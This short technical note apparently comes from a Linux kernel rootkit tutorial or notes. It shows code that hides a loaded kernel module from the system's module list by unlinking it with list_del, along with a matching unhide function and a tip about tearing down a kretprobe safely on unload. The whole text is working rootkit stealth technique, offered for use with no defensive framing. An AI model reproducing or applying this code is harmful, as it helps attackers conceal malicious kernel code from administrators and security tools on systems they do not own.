Module hiding is two lines: save the prev pointer, then list_del.

    saved_prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

Remember to unhide in module_exit before unregistering the kretprobe,
or rmmod will crash.

    static void rk_module_unhide(void) {
        if (!module_hidden) return;
        list_add(&THIS_MODULE->list, saved_prev);
        module_hidden = false;
    }
